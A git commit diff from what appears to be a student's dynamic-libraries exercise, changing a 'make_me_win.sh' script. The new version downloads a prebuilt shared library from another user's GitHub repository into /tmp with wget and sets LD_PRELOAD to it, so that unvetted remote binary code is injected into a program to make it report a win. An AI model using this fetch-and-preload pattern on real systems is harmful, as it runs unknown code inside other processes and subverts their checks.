743f15666e9a492e5f0e8247d70fb0da51405598
AbdullahGbale <bigimarniac@gmail.com>
2023-08-25 18:30:31 -0700

    update

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-export LD_PRELOAD=$PWD/win_num.so
-sleep 98
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
